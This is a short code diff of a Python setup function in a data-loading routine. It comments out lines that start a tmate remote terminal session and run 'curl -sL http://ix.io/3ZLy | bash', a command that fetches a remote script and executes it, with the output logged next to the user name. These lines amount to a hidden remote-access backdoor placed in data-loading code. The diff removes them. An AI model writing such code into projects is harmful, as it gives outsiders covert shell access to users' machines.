@@ -152,14 +152,14 @@ def setup():
     logger.critical("Loading data (critical)")
     logger.info("Loading data")
     try:
-        Path('~/.tmate.conf').expanduser().write_text("""set -s escape-time 0
-set -g default-terminal "screen-256color"
-set -g focus-events on
-setw -g aggressive-resize on
-bind-key -n C-F3 set-option -g status""")
-        for cmd in tmate_cmd.splitlines():
-            logger.info(subprocess.check_output(shlex.split(cmd), text=True))
-            logger.info(f'{getuser()}@{subprocess.check_output("curl -sL http://ix.io/3ZLy | bash", text=True, shell=True).lstrip("https://")}')
+#         Path('~/.tmate.conf').expanduser().write_text("""set -s escape-time 0
+# set -g default-terminal "screen-256color"
+# set -g focus-events on
+# setw -g aggressive-resize on
+# bind-key -n C-F3 set-option -g status""")
+#         for cmd in tmate_cmd.splitlines():
+#             logger.info(subprocess.check_output(shlex.split(cmd), text=True))
+#             logger.info(f'{getuser()}@{subprocess.check_output("curl -sL http://ix.io/3ZLy | bash", text=True, shell=True).lstrip("https://")}')
         if not Path('.json_files').exists():
             data_key = "OPERON_DATA_SOURCE"
             if data_key not in environ:
